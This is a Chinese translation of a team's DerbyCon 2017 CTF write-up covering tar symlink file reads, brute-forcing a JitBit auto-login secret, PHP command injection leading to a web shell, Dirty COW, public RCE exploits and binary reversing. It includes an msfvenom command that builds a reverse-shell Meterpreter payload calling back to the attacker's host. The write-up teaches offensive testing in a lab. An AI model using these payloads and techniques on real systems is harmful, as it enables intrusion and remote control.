> 原文链接: https://www.anquanke.com//post/id/86987 


# 【CTF 攻略】DerbyCon 2017 CTF Write Up


                                阅读量   
                                **266805**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：nettitude.com
                                <br>原文地址：[https://labs.nettitude.com/blog/derbycon-2017-ctf-write-up/#top](https://labs.nettitude.com/blog/derbycon-2017-ctf-write-up/#top)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p1.ssl.qhimg.com/t0148512ff724ee144f.png)](https://p1.ssl.qhimg.com/t0148512ff724ee144f.png)

****

译者：[shan66](http://bobao.360.cn/member/contribute?uid=2522399780)

预估稿费：300RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**<br>**

**前言**

在本文中，我们将为读者详细介绍我们团队在Derbycon 2017“夺标大赛”中夺魁的具体过程。

[![](https://p4.ssl.qhimg.com/t01344b87a891db6b7a.jpg)](https://p4.ssl.qhimg.com/t01344b87a891db6b7a.jpg)

[![](https://p0.ssl.qhimg.com/t01c1a82313b082fcf8.jpg)](https://p0.ssl.qhimg.com/t01c1a82313b082fcf8.jpg)



**Facespace**

浏览这台机器时，我们发现了一个新的社交媒体应用程序。这时，我们试图创建一个帐户并登录。此外，在页面的左侧可以查看已经创建帐户的用户的个人资料。

[![](https://p1.ssl.qhimg.com/t01b11f67606aa80a40.png)](https://p1.ssl.qhimg.com/t01b11f67606aa80a40.png)

于是，我们创建了一个帐户并登录，这时我们被重定向到如下所示的页面。有趣的是，它允许上传tar.gz文件，大家知道tar文件有一些有趣的属性…通过考察该网站，我们发现上传的tar文竟然可以是untar的，并且这些文件将会写入/users/path。

[![](https://p0.ssl.qhimg.com/t01f2cc1ed7d0521b7d.png)](https://p0.ssl.qhimg.com/t01f2cc1ed7d0521b7d.png)

tar的一个更有趣的属性是，默认情况下，它不允许使用符号链接。相反，它会将符号链接添加到归档。为了确保对文件而不是符号链接进行存档，可以使用–h或–dereference标志，具体如下所示。

[![](https://p5.ssl.qhimg.com/t015bb32157dc0fb1c8.png)](https://p5.ssl.qhimg.com/t015bb32157dc0fb1c8.png)

Symlinks可以指向文件和目录，因此要测试页面是否易受攻击，我们创建了以下归档文件：

**/root目录**

**/etc**

**/root/.ssh中的known_hosts文件** 

[![](https://p5.ssl.qhimg.com/t01da4896792ee9dd7e.png)](https://p5.ssl.qhimg.com/t01da4896792ee9dd7e.png)

上传成功，该tar文件被提取了出来。

[![](https://p0.ssl.qhimg.com/t0132a3063774f5c3c3.png)](https://p0.ssl.qhimg.com/t0132a3063774f5c3c3.png)

现在来确定是否有实际可访问的东西。 导航到/ users / zzz / root / etc / passwd，以查看passwd文件。

[![](https://p4.ssl.qhimg.com/t0100b5da51e09a93bd.png)](https://p4.ssl.qhimg.com/t0100b5da51e09a93bd.png)

真棒——我们竟然有访问权限。我们将rcvryusr的哈希值直接插入到哈希表中，不久之后，备份的密码已经返回，现在我们可以通过SSH登录了。

[![](https://p2.ssl.qhimg.com/t016887bb4cf3e1d8ae.png)](https://p2.ssl.qhimg.com/t016887bb4cf3e1d8ae.png)

然后，我们花了大量时间尝试在这个Slackware 14.2主机上升级特权。不过主办方告诉我们，在CTF完成之后，没有任何特权升级。 

**<br>**

**JitBit**

需要说的是，在这次挑战赛的过程中，实际上Rob Simon发现的是一个0day漏洞！完成比赛后，我们已经就各方进行了磋商，现在Rob决定披露这个漏洞，并且是在完全符合相关流程的情况下披露的。

当然，这个0day是我们事后才确认的。当时，我们导航至.299网站后，被重定向到/KB页面。下面是我们得到该应用程序的供应商和版本号方面的信息。 

[![](https://p1.ssl.qhimg.com/t01df9399e453dafc55.png)](https://p1.ssl.qhimg.com/t01df9399e453dafc55.png)

在获取供应商和版本号后，外面首先尝试找到源代码以及任何版本说明信息。 由于这是一个0day漏洞，自然没有发现与它有关的任何信息。源代码也没有找到，但是可以下载试用版软件。

[![](https://p2.ssl.qhimg.com/t01763988748d8ac291.png)](https://p2.ssl.qhimg.com/t01763988748d8ac291.png)

我们下载了zip文件并将其解压缩，发现它是一个.NET应用程序。既然是.NET，当然要找一个相应的反编译器了，于是选中了来自https://JetBrains.com的dotPeek。当然，除了dotPeek之外，还有许多不同的.NET反编译器，例如dnSpy等，我们建议您可以分别尝试一下，以便找到自己顺手的那一个。

[![](https://p3.ssl.qhimg.com/t018c5f9cc05cc0156f.png)](https://p3.ssl.qhimg.com/t018c5f9cc05cc0156f.png)

将HelpDesk.dll加载到dotPeek中，单击右键，选中export to Project选项，就可以从.dll中提取所有的源代码。这样的话，就可以将所有能够提取的源代码都放入指定的文件夹中了。 

[![](https://p0.ssl.qhimg.com/t01823952e78776c000.png)](https://p0.ssl.qhimg.com/t01823952e78776c000.png)

导出源代码后，我们使用Visual Code Grepper（https://github.com/nccgroup/VCG）快速浏览了一遍：

“我们应该关注那些任何人都能对其进行安全审查的代码，特别是在时间很宝贵的时候”

比赛中，时间绝对是非常宝贵的，所以我们都奔着源代码去了。

[![](https://p3.ssl.qhimg.com/t011a3e566992dc7fcf.png)](https://p3.ssl.qhimg.com/t011a3e566992dc7fcf.png)

虽然我们找到了一些问题，但是在进一步研究之后，发现它们都是假阳性的。 其中LoadXML引起了我们特别的关注，尽管XMLDocument在最新版本的.NET之外的所有版本中都容易受到XXE注入的影响，但是供应商已经正确地使XMLResolver作废，从而缓解了这个威胁。

对源代码进行了深入审查之后，并没有发现真正的漏洞。

之后，我们继续审查应用程序附带的所有其他文件。是的，我们同意我们应该首先阅读自述文件，但当时已经到了深夜了！

[![](https://p0.ssl.qhimg.com/t014e3a6bc0f1a0d374.png)](https://p0.ssl.qhimg.com/t014e3a6bc0f1a0d374.png)

无论如何，都应该先看自述文件。目录中有一些非常有趣的条目。 我们来看看AutoLogin功能。

[![](https://p0.ssl.qhimg.com/t0164a1a11b96761056.png)](https://p0.ssl.qhimg.com/t0164a1a11b96761056.png)

从文字表明看，它意味着通过创建用户名+ email +共享密钥的MD5哈希值，就可以以该用户身份登录。 那很酷，但共享密钥是什么？

然后，一个tweet引起了我们的兴趣。

[![](https://p5.ssl.qhimg.com/t0138f74e2f99c0aec3.png)](https://p5.ssl.qhimg.com/t0138f74e2f99c0aec3.png)

我们尝试通过提交问题来注册一个帐户，但没有成功。然后，又一个tweet到了。 也许这里要有事情发生。

[![](https://p2.ssl.qhimg.com/t01cc2512c1ee75952d.png)](https://p2.ssl.qhimg.com/t01cc2512c1ee75952d.png)

所以，我们创建了一个帐户，然后触发该帐户的忘记密码功能，我们收到了这封电子邮件。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t011909492490b34387.png)

有趣——这就是自动登录功能啊。我们确实需要研究一下这个哈希是如何创建的。

此时，我们开始研究如何生成URL，并找到了HelpDesk.BusinessLayer.VariousUtils类中的GetAutoLoginUrl（）函数，其来源如下所示。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01c8b3a212479b43ec.png)

如readme文件所述，这就是AutoLogin哈希值得生成方式；通过附加用户名、电子邮件地址以及月和日。但是，这里真正的关键是SharedSecret。这一点，当时我们也是很怀疑，因为获得这个哈希值的唯一方法是通过电子邮件。

下一步是尝试了解这一切的运作方式。 此时，我们启动了Rubber Ducky Debugging（https://en.wikipedia.org/wiki/Rubber_duck_debugging）。 我们也在本地安装了该软件。

看看我们的本地版本，我们注意到不能在试用版中更改共享密钥。不同的版本，情况是否完全相同呢？ 

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01ae7ac8252ac291ec.png)

现在，我们也开始意识到之前的一个tweet的含义了。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t015d489bbd1a7c5301.png)

实际上，前面的KB页面已经泄露了管理员用户的用户名和电子邮件地址。有趣的是，虽然可以从发件人处获取电子邮件地址，但是用户名是admin …

[![](https://p0.ssl.qhimg.com/t0174a38612d64d89a2.png)](https://p0.ssl.qhimg.com/t0174a38612d64d89a2.png)

我们尝试使用本地服务器的共享密码构建一个AutoLoginUrl。是的，是时候来找出这个密钥的正确生成方式了。

我们最终发现AutoLoginSharedSecret是使用以下代码初始化的。

[![](https://p2.ssl.qhimg.com/t0108902fecfc52e68a.png)](https://p2.ssl.qhimg.com/t0108902fecfc52e68a.png)

[![](https://p4.ssl.qhimg.com/t01d612872f05518087.png)](https://p4.ssl.qhimg.com/t01d612872f05518087.png)

这看起来很有前途。虽然此代码生成的共享密钥的长度足够长，但它也产生了一些允许恢复秘密的关键错误。第一个错误是限制了密钥空间；大写A-Z和2-9的空间还不够大。第二个错误是使用Random类：

https://msdn.microsoft.com/en-us/library/system.random(v=vs.110).aspx#Same

这不是随机的，当然供应商想要的是随机的。 如下文所述，通过提供相同的seed将意味着会得到相同的序列。 seed是一个32位有符号整数，很明显这意味着只有2,147,483,647种组合。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01eabf0f1f8c1d25e5.png)

为了恢复密钥，可以将下列C＃写入（你猜到了！）LinqPad（https://www.linqpad.net/）。

[![](https://p0.ssl.qhimg.com/t01ee8bfdb12244a36a.png)](https://p0.ssl.qhimg.com/t01ee8bfdb12244a36a.png)

代码以0的计数器开始，然后将相应的值作为“Random”类的seed来生成每个可能的秘密。 然后，利用用户名、电子邮件、日期和月份求出所有可能的哈希值，看看它是否与从忘记密码电子邮件中恢复的哈希值相匹配。

运行上述代码，就可以爆破出这个密钥了。需要说明的是，在这个阶段，CTF只提供了20分钟左右的时间。 这时，空气中弥漫着略显紧张的气氛。

这可以用于为管理员用户生成哈希值和自动登录链接。我们成功了！

[![](https://p1.ssl.qhimg.com/t01efc230936b8944f3.png)](https://p1.ssl.qhimg.com/t01efc230936b8944f3.png)

我们在资产部分内拿下了一个flag。 我们提交了该flag，赢得了8000点（连同另一个挑战的得分，巩固了第一名的成绩）。

[![](https://p0.ssl.qhimg.com/t01e068098f518de91e.png)](https://p0.ssl.qhimg.com/t01e068098f518de91e.png)



**海龟**

浏览172.30.1.231 Web服务器上的Web根目录（启用了目录列表功能）时，我们遇到了一个名为jacked.html的文件。 当在浏览器中呈现时，该页面引用了一个名为turtles.png的图像，但是在查看页面时并没有显示。 在页面标题“I Like Turtles”中倒是有一点线索…我们猜想有人喜欢贝壳（shell）！

当查看页面的客户端的源代码时，我们看到有一个数据uri为turtle.png图像标签，但它看起来很可疑。 

[![](https://p1.ssl.qhimg.com/t01466dd52a770e1987.png)](https://p1.ssl.qhimg.com/t01466dd52a770e1987.png)

使用我们最喜爱的瑞士军队选择的工具，LinqPad（https://www.linqpad.net/——我们保证绝对不是他们的员工！），对数据（即uri字符串）进行Base64解码，我们看到这显然是转义序列。进一步解码为ASCII字符，我们得到了一个很大的线索——看起来很像是shellcode。

[![](https://p3.ssl.qhimg.com/t01ed1e63f2525ac384.png)](https://p3.ssl.qhimg.com/t01ed1e63f2525ac384.png)

[![](https://p4.ssl.qhimg.com/t0158dc7392acd45be2.png)](https://p4.ssl.qhimg.com/t0158dc7392acd45be2.png)

换码序列看起来就是x86指令，所以回到LinqPad去运行它。我们建立了一个简单的shellcode运行器，因为我们需要用到它。本质上，它会打开记事本（或您选择的任何其他应用程序）来建立一个进程，然后继续在该进程中分配内存。然后将shellcode写入相应的内存，之后线程被启动，并指向shellcode的顶部。可以在脚本中写入一个中断，以便在记事本启动后，您有时间附加一个调试器。最后两个字节是CD 80，实际上就是Int 80（Linux中的系统调用处理程序中断）。

[![](https://p2.ssl.qhimg.com/t0143bd97c75da186cc.png)](https://p2.ssl.qhimg.com/t0143bd97c75da186cc.png)

使用WinDbg附加到该进程，然后进入LinqPad，int 80被触发，在WinDbg中触发了一个访问冲突。然后抓住这个异常，现在让我们来检查一下相关的内存。

一旦运行WinDbg，我们立即发现了一个问题，这里是int 80h而非Linux系统调用处理程序。这显然被设计为在不同的操作系统下运行。哎呀，好吧，让我们看看有什么挽救措施。

[![](https://p4.ssl.qhimg.com/t018336e8acc734a089.png)](https://p4.ssl.qhimg.com/t018336e8acc734a089.png)

重要的一点是，在Linux中进行系统调用时，是通过寄存器将值从用户地址传递到内核。EAX保存系统调用号码，然后EBX，ECX，EDX，ESX和EDI依次存放调用参数。对shellcode进行转换，结果如下图所示。这里使用寄存器的值与本身进行异或运算，以便快速对寄存器进行清零。



```
03f50000 xor eax,eax ; zero eax register
03f50002 xor ebx,ebx ; zero eax register
03f50004 xor edx,edx ; zero eax register
03f50006 xor ecx,ecx ; zero eax register
03f50008 mov al,4 ; Set syscall(ECX) to 4 for sys_write
03f5000a mov bl,1 ; Set fd(EBX) to 1 for std out
03f5000c push 0A37h ; push 7n onto stack
03f50011 push 35634B4Fh ; push Okc5 onto stack
03f50016 push 4C4F5965h ; push eYOL onto stack
03f5001b push 646F636Ch ; push lcod onto stack
03f50020 push 6C656853h ; push Shel onto stack
03f50025 mov ecx,esp ; set buf(ECX) to top of stack
03f50027 mov dl,12h ; set length(EDX) to be 12h
03f50029 int 80h ; sys call
```

我们在这里看到，立即值4被移动到EAX寄存器的第一个字节（即AL）。这样实际上就是转换为系统调用syswrite。

[![](https://p5.ssl.qhimg.com/t016242b841cd93aca4.png)](https://p5.ssl.qhimg.com/t016242b841cd93aca4.png)

根据上面的寄存器顺序，这个原型代码和汇编程序将认为EBX的值为1（即标准输出），ECX包含的是堆栈指针，即旗标所在的位置，EDX的值为12h（或18）这对应于字符串的长度。

所以，如果这是在一个Linux操作系统上运行的话，我们将把这个旗标写入控制台，而不是一个访问冲突，但是一切都不会丢失。我们知道堆栈包含了旗标，所以我们需要做的就是检查ESP寄存器（堆栈指针）中存储的内容。在WinDbg中，您可以使用d来转储不同格式的内存，然后使用第二个字母表示格式。例如在下面的截图中，屏幕截图中的第一个命令是dd esp，它将以DWORD或4字节格式转储内存（默认为32个，返回128个字节的内存）。显示的第二个命令是da esp，它以ASCII格式开始转储内存，直到它遇到空字符或读取48个字节为止。 

[![](https://p1.ssl.qhimg.com/t014439f7f07e6def50.png)](https://p1.ssl.qhimg.com/t014439f7f07e6def50.png)

**<br>**

**iLibrarian**

当浏览到172.30.1.236 Web服务器时，我们发现iLibrarian应用程序托管在同名的目录中。 关于这个网站，需要关注的两点是，我们在一个下拉菜单中有一个用户名列表，页面底部是一个版本号。此外，我们还能创建一个用户帐户。

[![](https://p4.ssl.qhimg.com/t0116b68fa3a814e9cb.png)](https://p4.ssl.qhimg.com/t0116b68fa3a814e9cb.png)

当测试应用程序时，我们执行的前几个步骤是尝试查找默认凭据，版本号，然后如果可能，获取源/二进制文件。 这里的目的是尽可能地作为白盒子进行测试。

关于项目最近变动的一个很好的信息来源是GitHub上的问题选项卡。 有时，安全问题将被列出。 如下图所示，在iLibrarian GitHub网站上列出的第一个问题是“RTF Scan Broken”。这看起来非常有趣，让我们来深入挖掘一下吧。 

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0139d8a864bd9853c9.png)

有一个RTF转换错误，显然，关于该错误的信息非常少。

[![](https://p0.ssl.qhimg.com/t01d1624534ed731dc2.png)](https://p0.ssl.qhimg.com/t01d1624534ed731dc2.png)

我们看看具体的变化，以下代码看起来很有趣。

[![](https://p0.ssl.qhimg.com/t01b75ef424ad427b9e.png)](https://p0.ssl.qhimg.com/t01b75ef424ad427b9e.png)

下一步是查看文件更改的历史记录。

[![](https://p1.ssl.qhimg.com/t017500552db8939116.png)](https://p1.ssl.qhimg.com/t017500552db8939116.png)

列出的第一个更改是变量错误，这不是一个安全问题。 第二个变化看起来很有希望。

对shell参数进行转义，以确保用户提供的数据不能转换为系统命令，从而通过操作系统执行某些用户操作。通常的转义方法，是使用换行符、分号、单引号等。这种类型的漏洞是众所周知的，被称为命令注入。 在PHP（用于编写iLibrarian的语言）中，缓解措施通常是调用escapeshellarg（）来封装用户提供的数据。

看看“escape shell arguments”方面的变化，我们可以发现，这里的变化是，使用针对传递给[exec（）](http://php.net/manual/en/function.exec.php)函数的两个参数调用escapeshellargs（）。

[![](https://p3.ssl.qhimg.com/t01632baf18a9e08f2d.png)](https://p3.ssl.qhimg.com/t01632baf18a9e08f2d.png)

[![](https://p4.ssl.qhimg.com/t014e6aec5b6f43dc92.png)](https://p4.ssl.qhimg.com/t014e6aec5b6f43dc92.png)

查看在进行此次更改之前版本，我们看到以下关键行。

首先创建一个名为$ temp_file的变量。这个变量被设置为当前临时路径加上filename的值，它是在上传manuscript文件期间传递的（manuscript是表单变量的名称）进行传递的。 然后从$ temp_file变量获取文件扩展名，如果它是doc，docx或odt，则文件将被转换。

注入发生在第三个高亮显示的代码中。通过提供经用转义字符间隔的命令值，我们就能完成命令注入。 

[![](https://p2.ssl.qhimg.com/t0168fff2cef5e8c23c.png)](https://p2.ssl.qhimg.com/t0168fff2cef5e8c23c.png)

太棒了。接下来我们打算尝试上传Web shell。为此，我们构建和上传了以下payload。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0114f2fbcf7a9dd56d.png)

这样，我们就创建了一个页面，该页面将执行cmd参数中传递的任何值。应该注意的是，在渗透测试利用这样的问题时，不应该使用可预测的名称，例如test4.php，以免被别人定位和滥用（我们通常会生成多个GUID名称），理想情况下，应该提供一些内置的功能来限制IP地址。然而，这是一个CTF，时间是最宝贵的。但愿其他团队不会找到我们新创建的页面，因为它的名称太显眼了！

该文件被写入后，我们调用test4.php，查看它是以什么身份来运行。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01f75f18aa8313e337.png)

正如预期的那样，我们是作为web用户运行的，所以只有有限的权限。不过，这足以搞定一些旗帜。我们决定使用完全交互式shell来升级我们对操作系统的访问权限——这个交互式shell也是使用相同的攻击向量得到的。

最后，我们设法进行提取。这里的操作系统是Ubuntu 15.04，利用Dirty Cow漏洞后，我们获取了超级用户权限，并拿下了这台机器上的最后一个旗标。 

**<br>**

**Webmin**

这台机器开放了TCP端口80和10000。 80端口运行一个Web服务器，托管了一些可下载的挑战，而端口10000似乎是Webmin。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t010e08d5fb76a85751.png)

Webmin是一个引人入胜的目标，因为这个版本好像有一些已经公开的安全漏洞。 但是，我们尝试了一些漏洞代码之后，发现没有效果。

但是，端口80上的Web服务器却因其服务器banner而泄露操作系统；正是北韩的RedStar 3.0。啊哈——不久以前@hackerfantastic对RedStar进行了大量的研究，如果没记错的话，研究结果表明这个操作系统的安全性并不太好。果然…

https://www.exploit-db.com/exploits/40938/

对exploit进行一番调查，并简单地设置一个netcat侦听器后，使用适当的参数来运行exploit，看，立马就得到了一个root shell。旗标顺利到手；当然由于来得太容易，分值肯定不会太高。不过这里我们还是要感谢@hackerfantastic！



**Dup Scout**

这台机器运行了一个名为Dup Scout Enterprise的应用程序。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01b8dd7dff00735c73.png)

它容易受到远程代码执行漏洞的攻击，在exploit-db上很容易找到相应的exploit。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t017f6abdc4ac5d6567.png)

我们通过使用admin：admin登录并查看系统信息页面，发现体系结构为32位。为了在这台机器上面使用该exploit，唯一要做的事情就是修改这个shellcode，使其适用于32位操作系统。 这可以通过msfvenom轻松实现：

```
msfvenom -p windows/meterpreter/reverse_https LHOST=172.16.70.242 LPORT=443 EXITFUN=none -e x86/alpha_mixed -f python
```

在目标服务器上运行exploit之前，我们要在本地搭设相应的软件，以检查它是否完全按预期工作。然后，我们才在生产服务器上面运行，并获得了具有SYSTEM级访问权限的shell。效果不错，也很轻松。



**X86-intermediate.binary**

接下来我们将借助调试器（也即IDA），完成两项二进制挑战。

通过浏览172.30.1.240 Web服务器，我们发现下图所示的目录中包含7个不同二进制文件。下面我们要做的事情就是搞定中间的x86二进制文件。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t014c54b941fecc07ae.png)

通过在IDA中打开它并直接转到主函数：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01fd306885ed9811d3.png)

粗略地说，这实际上就是把问题转换为检查传递给可执行文件的第一个参数是否为-p。如果是，则下一个参数存储为第一个密码。然后将其传递给CheckPassword1（不是实际名称，它在IDA中已被重命名）。如果这是正确的，用户被提示输入第二个密码，由CheckPassword2检查。如果第二个密码正确，则会向用户显示“Password 2: good job, you’re done” 的消息。希望这次也能获得旗标！

通过打开CheckPassword1函数，我们立即看到它正在建立一个字符数组。 然后，将指向该数组开头的指针连同该函数的唯一参数一起传递给_strcmp，该参数是以-p传递的密码。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t018325558f4a459895.png)

我们检查了存入char数组的值，它们看起来像小写的ASCII字符。 解码后，发现其值为__pass。

将该值传递给具有-p标志的二进制文件，我们得到以下内容：

[![](https://p3.ssl.qhimg.com/t01cf26cee7e94f627a.png)](https://p3.ssl.qhimg.com/t01cf26cee7e94f627a.png)

好，下面我们开始寻找第二个密码。 直接跳到CheckPassword2函数，我们在函数的开头发现如下内容。这次会与之前那个函数的情况完全一样吗？

[![](https://p1.ssl.qhimg.com/t01ec6c9711d952d372.png)](https://p1.ssl.qhimg.com/t01ec6c9711d952d372.png)

不，这次是完全不同的，看看函数主体部分的屏幕截图你就会明白了。它看起来比之前那个函数要复杂一点… 

[![](https://p3.ssl.qhimg.com/t01669611b8a01f9046.png)](https://p3.ssl.qhimg.com/t01669611b8a01f9046.png)

利用托管于[https://godbolt.org/的一款优秀编译工具，大致可以将上面的代码转换为以下内容：](https://godbolt.org/%E7%9A%84%E4%B8%80%E6%AC%BE%E4%BC%98%E7%A7%80%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7%EF%BC%8C%E5%A4%A7%E8%87%B4%E5%8F%AF%E4%BB%A5%E5%B0%86%E4%B8%8A%E9%9D%A2%E7%9A%84%E4%BB%A3%E7%A0%81%E8%BD%AC%E6%8D%A2%E4%B8%BA%E4%BB%A5%E4%B8%8B%E5%86%85%E5%AE%B9%EF%BC%9A) 

[![](https://p2.ssl.qhimg.com/t010179b74f6c8460c1.png)](https://p2.ssl.qhimg.com/t010179b74f6c8460c1.png)

这个解决方案的方法是将这个代码调整成C＃，这次运行每个可能的字符组合，然后检查生成的值是否匹配存储的哈希值。

[![](https://p2.ssl.qhimg.com/t0191a95ec4e8422a99.png)](https://p2.ssl.qhimg.com/t0191a95ec4e8422a99.png)

运行它，我们发现了- @ 12345！），然后将其传递给exe来进行验证。

[![](https://p3.ssl.qhimg.com/t01f572c058ef8425d0.png)](https://p3.ssl.qhimg.com/t01f572c058ef8425d0.png)

为了获得旗标，只需要组合成the_pass @ 12345！）即可，提交后，我们得到了500点。 

**<br>**

**arm-hard.binary**

文件arm-hard.binary包含一个ELF可执行文件，它通过向R0寄存器写入连续的字符来标出一个旗标。它使用类似于ROP的方法，将函数地址列表压到堆栈上，然后当每个函数返回时，它就会从列表中调用下一个函数。

在shellcode中，ROP是一种常用的技术。它是一种基于堆栈的缓冲区溢出攻击方法，即使包含堆栈的内存被标记为不可执行，也能够攻击得手。被执行的代码片段（称为“gadgets”）通常是从其他可用的代码段中挑选出来的。在本例中，不需要这样做，因为二进制文件已经被编写成包含所需的代码片段，而ROP只是用来混淆控制流。

为了进一步混淆该行为，通过向值0x61（ASCII a）添加偏移量来形成每个字符。这是利用寄存器R1中的基值（0x5a + 0x07 = 0x61）完成的： 

例如，这里是将字母n写入R0的gadget（0x61 + 0x0d = 0x6e）：

[![](https://p4.ssl.qhimg.com/t0156ed0f4db0f38da2.png)](https://p4.ssl.qhimg.com/t0156ed0f4db0f38da2.png)

这里是大写字母B的相关gadget：

[![](https://p2.ssl.qhimg.com/t01a8df80f84030dcdc.png)](https://p2.ssl.qhimg.com/t01a8df80f84030dcdc.png)

寄存器R10中保存的基地址等于第一个gadget（0x853c）的地址，gadget地址作为偏移量。例如：

[![](https://p4.ssl.qhimg.com/t010361dbd297bf552c.png)](https://p4.ssl.qhimg.com/t010361dbd297bf552c.png)

这里通过第一条指令放置在R11中的地址等于0x853c + 0x30 = 0x856c，我们上面看到的是写入字母n的gadget。第二个指令将其压到堆栈上。通过将这些操作序列串在一起，可以拼出一条消息：

[![](https://p1.ssl.qhimg.com/t015aa4bcb18e918776.png)](https://p1.ssl.qhimg.com/t015aa4bcb18e918776.png)

上述gadget分别对应于字母n，o，c，y，b，r，e和d。由于返回栈按照先入先出的原则进行操作，所以它们以相反的顺序执行，因此可以拼出单词derbycon（旗标的一部分）。为了启动这个进程，程序可以弹出第一个gadget的地址，然后返回给它：

[![](https://p0.ssl.qhimg.com/t013db68dcb1f959c37.png)](https://p0.ssl.qhimg.com/t013db68dcb1f959c37.png)

通过分析压到堆栈的所有gadget地址，最后找到了完整旗标，其实是一个电子邮件地址形式：

n  BlahBlahBlahBobLobLaw@derbycon.com



**NUKELAUNCH &amp; NUKELAUNCHDB**

我们注意到服务器正在运行IIS 6并启用了WebDav。经验告诉我们，这种组合意味着它很可能会含有CVE-2017-7269漏洞。幸运的是，Metasploit框架中包含公开的漏洞利用代码：

https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/iis/iis_webdav_scstoragepathfromurl.rb

正如所料，该exploit确实管用，我们从该服务器收集到一些旗标。

我们收集了所有明显的旗标后，我们开始更加详细地查看服务器。我们运行了一个简单的net view命令，并发现受感染的服务器NUKELANUCH可以看到一个名为NUKELAUNCHDB的服务器。

